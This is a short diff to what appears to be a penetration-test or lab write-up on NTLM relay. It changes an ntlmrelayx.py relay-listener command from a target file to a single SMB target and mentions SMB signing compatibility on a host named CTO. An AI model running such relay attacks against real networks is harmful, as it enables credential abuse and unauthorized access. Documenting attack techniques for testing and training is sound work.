@@ -146,7 +146,7 @@ This confirms that CTO's SMB signing configuration is compatible with the relay 
 The relay listener was started against CTO:
 
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo ntlmrelayx.py -t smb://<target-ip> -smb2support
 ```
 
 or, when using a target file:
